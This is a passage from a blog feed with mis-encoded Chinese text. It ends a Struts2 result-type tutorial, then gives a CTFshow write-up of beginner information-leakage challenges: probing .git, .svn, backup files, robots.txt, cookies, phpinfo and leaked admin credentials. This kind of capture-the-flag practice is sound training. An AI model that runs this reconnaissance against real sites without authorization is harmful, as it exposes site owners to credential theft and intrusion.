çš„nameå±æ€§æœ‰ä¸¤ä¸ªå€¼,åˆ†åˆ«å¦‚ä¸‹:</p><table><thead><tr><th>å±æ€§</th><th>æè¿°</th></tr></thead><tbody><tr><td>location</td><td>æŒ‡å®šè¯¥é€»è¾‘è§†å›¾æ‰€å¯¹åº”çš„å®é™…è§†å›¾èµ„æºã€‚</td></tr><tr><td>parse</td><td>æŒ‡å®šåœ¨é€»è¾‘è§†å›¾èµ„æºåç§°ä¸­æ˜¯å¦å¯ä»¥ä½¿ç”¨OGNLè¡¨è¾¾å¼ã€‚é»˜è®¤å€¼ä¸ºtrue,è¡¨ç¤ºå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœè®¾ä¸ºfalse,åˆ™è¡¨ç¤ºä¸æ”¯æŒã€‚</td></tr></tbody></table><p>ä¸Šé¢çš„é…ç½®å¯ä»¥ç®€åŒ–ä¸ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="é¢„å®šä¹‰çš„ç»“æœç±»å‹"><a href="#é¢„å®šä¹‰çš„ç»“æœç±»å‹" class="headerlink" title="é¢„å®šä¹‰çš„ç»“æœç±»å‹"></a>é¢„å®šä¹‰çš„ç»“æœç±»å‹</h3><table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>å¯¹åº”ç±»</th></tr></thead><tbody><tr><td>chain</td><td>ç”¨æ¥å¤„ç†Action é“¾</td><td>com.opensymphony.xwork2.ActionChainResult</td></tr><tr><td>dispatcher</td><td>ç”¨æ¥è½¬å‘é¡µé¢ï¼Œé€šå¸¸å¤„ç† JSP</td><td>org.apache.struts2.dispatcher.ServletDispatcherResult</td></tr><tr><td>redirect</td><td>é‡å®šå‘åˆ°ä¸€ä¸ªURL</td><td>org.apache.struts2.dispatcher.ServletRedirectResult</td></tr><tr><td>redirectAction</td><td>é‡å®šå‘åˆ°ä¸€ä¸ª Action</td><td>org.apache.struts2.dispatcher.ServletActionRedirectResult</td></tr><tr><td>plainText</td><td>æ˜¾ç¤ºæºæ–‡ä»¶å†…å®¹ï¼Œå¦‚æ–‡ä»¶æºç </td><td>org.apache.struts2.dispatcher.PlainTextResult</td></tr><tr><td>freemarker</td><td>å¤„ç† FreeMarker æ¨¡æ¿</td><td>org.apache.struts2.views.freemarker.FreemarkerResult</td></tr><tr><td>httpheader</td><td>æ§åˆ¶ç‰¹æ®Š http è¡Œä¸ºçš„ç»“æœç±»å‹</td><td>org.apache.struts2.dispatcher.HttpHeaderResult</td></tr><tr><td>stream</td><td>å‘æµè§ˆå™¨å‘é€ InputSream å¯¹è±¡ï¼Œé€šå¸¸ç”¨æ¥å¤„ç†æ–‡ä»¶ä¸‹è½½ï¼Œè¿˜å¯ç”¨äºè¿”å› AJAX æ•°æ®ã€‚</td><td>org.apache.struts2.dispatcher.StreamResult</td></tr><tr><td>velocity</td><td>å¤„ç† Velocity æ¨¡æ¿</td><td>org.apache.struts2.dispatcher.VelocityResult</td></tr><tr><td>xslt</td><td>å¤„ç† XML/XLST æ¨¡æ¿</td><td>org.apache.struts2.views.xslt.XSLTResult</td></tr></tbody></table><p>è¡¨ä¸­ä¾‹ä¸¾äº†Struts2ä¸­é¢„å®šä¹‰çš„å…¨éƒ¨11ç§ç»“æœç±»å‹ï¼Œå…¶ä¸­dispatcheræ˜¯é»˜è®¤çš„ç»“æœç±»å‹ï¼Œä¸»è¦ç”¨æ¥ä¸JSPæ•´åˆã€‚å…¶ä¸­ï¼Œdispatcherå’Œredirectæ˜¯æ¯”è¾ƒå¸¸ç”¨åˆ°çš„ç»“æœé›†ã€‚</p><h3 id="dispatcherç»“æœç±»å‹"><a href="#dispatcherç»“æœç±»å‹" class="headerlink" title="dispatcherç»“æœç±»å‹"></a>dispatcherç»“æœç±»å‹</h3><p>dispatcherç»“æœç±»å‹ç”¨æ¥è¡¨ç¤ºâ€œè½¬å‘â€åˆ°æŒ‡å®šç»“æœèµ„æºï¼Œå®ƒæ˜¯struts2é»˜è®¤çš„ç»“æœç±»å‹ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;location&quot;</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parse&quot;</span> &gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸­ï¼Œlocationå‚æ•°ç”¨äºæŒ‡å®šActionæ‰§è¡Œå®Œæ¯•åè¦è½¬å‘çš„ç›®æ ‡èµ„æºï¼›parseå‚æ•°æ˜¯ä¸€ä¸ªå¸ƒå°”å‹çš„å€¼ï¼Œé»˜è®¤æ˜¯trueï¼Œè¡¨ç¤ºè§£ælocationå‚æ•°ä¸­çš„OGNLè¡¨è¾¾å¼ã€‚</p><h3 id="redirectç»“æœç±»å‹"><a href="#redirectç»“æœç±»å‹" class="headerlink" title="redirectç»“æœç±»å‹"></a>redirectç»“æœç±»å‹</h3><p>redirectç»“æœç±»å‹ç”¨æ¥é‡å®šå‘åˆ°æ–°çš„ç»“æœèµ„æºï¼Œè¯¥èµ„æºå¯ä»¥æ˜¯JSPæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯Actionæ–‡ä»¶ã€‚</p><p>å¯¹æœ¬æ–‡ä¸Šé¢<code>é€šè¿‡ActionContextç±»è®¿é—®Servlet API</code>æ ‡é¢˜ä¸‹é¢çš„struts.xmlä»£ç è¿›è¡Œæ›´æ”¹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ï¼Œä½¿ç”¨redirecté‡æ–°å®šå‘åˆ°success.jspï¼›ç”¨æˆ·åå’Œå¯†ç é”™è¯¯ï¼Œä½¿ç”¨çš„æ˜¯dispatcherçš„ç»“æœç±»å‹ï¼Œè·³è½¬åˆ°error.jspã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-Webå…¥é—¨-ä¿¡æ¯æ³„éœ²</title>
    <link href="/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>CTFshowé¶åœº Webå…¥é—¨ç³»åˆ—</p> <a id="more"></a><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h3 id="è€ƒç‚¹-æºç æ³„éœ²"><a href="#è€ƒç‚¹-æºç æ³„éœ²" class="headerlink" title="è€ƒç‚¹: æºç æ³„éœ²"></a>è€ƒç‚¹: æºç æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤</p></blockquote><p>æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°flag</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="è€ƒç‚¹-å‰å°JSç»•è¿‡"><a href="#è€ƒç‚¹-å‰å°JSç»•è¿‡" class="headerlink" title="è€ƒç‚¹: å‰å°JSç»•è¿‡"></a>è€ƒç‚¹: å‰å°JSç»•è¿‡</h3><blockquote><p>é¢˜ç›®æè¿°:jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</p></blockquote><p>æŸ¥çœ‹æºç æ–¹æ³•å¾ˆå¤š<br>1.ç¦ç”¨JS,å†æŸ¥çœ‹æºä»£ç ï¼›<br>2.åœ¨ç½‘å€å‰åŠ ä¸Š<code>view-source:</code>å³å¯æŸ¥çœ‹æºä»£ç <br>3.ctrl+uæŸ¥çœ‹æºä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;  <br><span class="hljs-comment">//ç¦ç”¨é¼ æ ‡å³é”®</span><br><span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;<br><span class="hljs-comment">//ç¦ç”¨é¡µé¢é€‰æ‹©</span><br><span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;<br>&lt;/script&gt;<br>   <span class="hljs-comment">//ç¦ç”¨F12é”®</span><br></code></pre></td></tr></table></figure><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><h3 id="è€ƒç‚¹-åè®®å¤´ä¿¡æ¯æ³„éœ²"><a href="#è€ƒç‚¹-åè®®å¤´ä¿¡æ¯æ³„éœ²" class="headerlink" title="è€ƒç‚¹: åè®®å¤´ä¿¡æ¯æ³„éœ²"></a>è€ƒç‚¹: åè®®å¤´ä¿¡æ¯æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šæ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p></blockquote><p>æŠ“åŒ…ï¼ŒæŸ¥çœ‹å“åº”å¤´ï¼Œå³å¯å¾—åˆ°flag</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><h3 id="è€ƒç‚¹-robotsåå°æ³„éœ²"><a href="#è€ƒç‚¹-robotsåå°æ³„éœ²" class="headerlink" title="è€ƒç‚¹: robotsåå°æ³„éœ²"></a>è€ƒç‚¹: robotsåå°æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šæ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p></blockquote><p>è®¿é—®robots.txtï¼Œå¾—åˆ°flagishere.txtä¿¡æ¯ï¼Œè®¿é—®å³å¯</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="è€ƒç‚¹-phpsæºç æ³„éœ²"><a href="#è€ƒç‚¹-phpsæºç æ³„éœ²" class="headerlink" title="è€ƒç‚¹: phpsæºç æ³„éœ²"></a>è€ƒç‚¹: phpsæºç æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šphpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p></blockquote><p>è®¿é—®index.phpsä¸‹è½½å¤‡ä»½æ–‡ä»¶</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><h3 id="è€ƒç‚¹-æºç å‹ç¼©åŒ…æ³„éœ²"><a href="#è€ƒç‚¹-æºç å‹ç¼©åŒ…æ³„éœ²" class="headerlink" title="è€ƒç‚¹: æºç å‹ç¼©åŒ…æ³„éœ²"></a>è€ƒç‚¹: æºç å‹ç¼©åŒ…æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šè§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p></blockquote><p>è®¿é—®<a href="http://www.zipä¸‹è½½æºç ,è§£å‹å¾—åˆ°fl000g.txt,é‡Œé¢çš„æ˜¯å‡flag,éœ€è¦è®¿é—®æ‰ä¼šå¾—åˆ°çœŸflag/">www.zipä¸‹è½½æºç ï¼Œè§£å‹å¾—åˆ°fl000g.txtï¼Œé‡Œé¢çš„æ˜¯å‡flagï¼Œéœ€è¦è®¿é—®æ‰ä¼šå¾—åˆ°çœŸflag</a></p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><h3 id="è€ƒç‚¹-Gitæ³„éœ²"><a href="#è€ƒç‚¹-Gitæ³„éœ²" class="headerlink" title="è€ƒç‚¹: Gitæ³„éœ²"></a>è€ƒç‚¹: Gitæ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>è®¿é—®ç›®å½•url/.git/</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><h3 id="è€ƒç‚¹-SVNæ³„éœ²"><a href="#è€ƒç‚¹-SVNæ³„éœ²" class="headerlink" title="è€ƒç‚¹: SVNæ³„éœ²"></a>è€ƒç‚¹: SVNæ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>è®¿é—®url/.svnå³å¯</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><h3 id="è€ƒç‚¹-vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"><a href="#è€ƒç‚¹-vimä¸´æ—¶æ–‡ä»¶æ³„éœ²" class="headerlink" title="è€ƒç‚¹: vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"></a>è€ƒç‚¹: vimä¸´æ—¶æ–‡ä»¶æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p></blockquote><p>æç¤ºåœ¨ä½¿ç”¨vimæ—¶æ„å¤–é€€å‡ºï¼Œä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ ¼å¼ä¸º .æ–‡ä»¶å.swpï¼Œè®¿é—®url/index.php.swpä¸‹è½½å¤‡ä»½æ–‡ä»¶</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><h3 id="è€ƒç‚¹-cookieæ³„éœ²"><a href="#è€ƒç‚¹-cookieæ³„éœ²" class="headerlink" title="è€ƒç‚¹: cookieæ³„éœ²"></a>è€ƒç‚¹: cookieæ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šcookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</p></blockquote><p>æŠ“åŒ…æŸ¥çœ‹cookieå‘ç°flag</p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><h3 id="è€ƒç‚¹-åŸŸåtxtè®°å½•æ³„éœ²"><a href="#è€ƒç‚¹-åŸŸåtxtè®°å½•æ³„éœ²" class="headerlink" title="è€ƒç‚¹: åŸŸåtxtè®°å½•æ³„éœ²"></a>è€ƒç‚¹: åŸŸåtxtè®°å½•æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šåŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</p></blockquote><p>åœ¨çº¿DNSåŸŸåè§£æï¼Œå³å¯å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://whois.chinaz.com/<br>http://www.jsons.cn/nslookup/<br>https://zijian.aliyun.com/<br></code></pre></td></tr></table></figure><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><h3 id="è€ƒç‚¹-æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"><a href="#è€ƒç‚¹-æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ" class="headerlink" title="è€ƒç‚¹: æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"></a>è€ƒç‚¹: æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p></blockquote><p>è®¿é—®åå°åœ°å€adminï¼Œç®¡ç†å‘˜è´¦å·adminï¼Œåœ¨ç½‘é¡µåº•æ‰¾åˆ°äº†ç”µè¯å·ç ï¼ŒçŒœæµ‹æ˜¯å¯†ç </p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><h3 id="è€ƒç‚¹-å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"><a href="#è€ƒç‚¹-å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²" class="headerlink" title="è€ƒç‚¹: å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"></a>è€ƒç‚¹: å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šæŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p></blockquote><p>åœ¨ç½‘é¡µåº•éƒ¨æ‰¾åˆ°ä¸€ä¸ªdoucumenté“¾æ¥ã€‚å¾—åˆ°åå°åœ°å€<code>/system1103/login.php</code>å’Œå¸å·å¯†ç </p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><h3 id="è€ƒç‚¹-ç¼–è¾‘å™¨é…ç½®ä¸å½“"><a href="#è€ƒç‚¹-ç¼–è¾‘å™¨é…ç½®ä¸å½“" class="headerlink" title="è€ƒç‚¹: ç¼–è¾‘å™¨é…ç½®ä¸å½“"></a>è€ƒç‚¹: ç¼–è¾‘å™¨é…ç½®ä¸å½“</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</p></blockquote><p>è®¿é—®url/editorï¼Œå‘ç°ä¸€ä¸ªç½‘é¡µè‡ªå¸¦çš„ç¼–è¾‘å™¨,ç‚¹å‡»ä¸Šä¼ å›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶ç›®å½•ï¼Œ/var/www/html/nothinghere ä¸­æœ‰ä¸€ä¸ªfl000g.txtï¼Œè®¿é—®<code>/nothinghere/fl000g.txt</code>å³å¯å¾—åˆ°flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><h3 id="è€ƒç‚¹-å¯†ç é€»è¾‘è„†å¼±"><a href="#è€ƒç‚¹-å¯†ç é€»è¾‘è„†å¼±" class="headerlink" title="è€ƒç‚¹: å¯†ç é€»è¾‘è„†å¼±"></a>è€ƒç‚¹: å¯†ç é€»è¾‘è„†å¼±</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p></blockquote><p>åœ¨åº•éƒ¨æ‰¾åˆ°é‚®ç®±ä¿¡æ¯ï¼Œè®¿é—®åå°åœ°å€/adminï¼Œç”¨æˆ·åadmin ï¼Œé€‰æ‹©å¿˜è®°å¯†ç ã€‚æŸ¥æ‰¾åˆ°é‚®ç®±qqæ‰€åœ¨åœ°ä¸ºè¥¿å®‰ï¼Œè¿”å›ä¿®æ”¹åçš„å¯†ç ï¼Œç™»å½•å³å¯å¾—åˆ°flagã€‚</p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><h3 id="è€ƒç‚¹-æ¢é’ˆæ³„éœ²"><a href="#è€ƒç‚¹-æ¢é’ˆæ³„éœ²" class="headerlink" title="è€ƒç‚¹: æ¢é’ˆæ³„éœ²"></a>è€ƒç‚¹: æ¢é’ˆæ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p></blockquote><p>è®¿é—®/tz.phpï¼Œçœ‹ä¸‹PHPå‚æ•°,ç‚¹å‡»phpinfoè¶…é“¾æ¥ï¼Œåœ¨phpinfoé¡µé¢æœç´¢ctfshowå³å¯</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><h3 id="è€ƒç‚¹-CDNç©¿é€"><a href="#è€ƒç‚¹-CDNç©¿é€" class="headerlink" title="è€ƒç‚¹: CDNç©¿é€"></a>è€ƒç‚¹: CDNç©¿é€</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šé€è¿‡é‡é‡ç¼“å­˜ï¼ŒæŸ¥æ‰¾åˆ°ctfer.comçš„çœŸå®IPï¼Œæäº¤ flag{IPåœ°å€}</p></blockquote><p>æ ¹æ®hintæç¤ºï¼Œç›´æ¥ping <a href="http://www.ctfshow.comå¾—åˆ°ipåœ°å€111.231.70.44/">www.ctfshow.comå¾—åˆ°IPåœ°å€111.231.70.44</a></p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><h3 id="è€ƒç‚¹-jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#è€ƒç‚¹-jsæ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="è€ƒç‚¹: jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>è€ƒç‚¹: jsæ•æ„Ÿä¿¡æ¯æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</p></blockquote><p>æŸ¥çœ‹æºç ï¼Œå‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/Flappy_js.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®/js/Flappy_js.jsæŸ¥çœ‹Flappy_js.jsæ–‡ä»¶ï¼Œå‘ç°äº†ä¸€æ®µç¼–ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(score&gt;<span class="hljs-number">100</span>)<br>&#123;<br><span class="hljs-keyword">var</span> result=<span class="hljs-built_in">window</span>.confirm(<span class="hljs-string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Unicodeè§£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹<br></code></pre></td></tr></table></figure><p>è®¿é—®/110.phpå³å¯</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><h3 id="è€ƒç‚¹-å‰ç«¯å¯†é’¥æ³„éœ²"><a href="#è€ƒç‚¹-å‰ç«¯å¯†é’¥æ³„éœ²" class="headerlink" title="è€ƒç‚¹: å‰ç«¯å¯†é’¥æ³„éœ²"></a>è€ƒç‚¹: å‰ç«¯å¯†é’¥æ³„éœ²</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p></blockquote><p>æŸ¥çœ‹æºç ï¼Œå‰ç«¯å«æœ‰æ³¨é‡Šä»£ç ï¼Œæ³„éœ²äº†ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    error_reporting(0);</span><br><span class="hljs-comment">    $flag=&quot;fakeflag&quot;</span><br><span class="hljs-comment">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="hljs-comment">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="hljs-comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="hljs-comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="hljs-comment">            echo $flag;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">    --&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ç”¨æˆ·åå’Œå¯†ç æç¤ºä¸æ­£ç¡®ï¼Œç”¨Postæäº¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 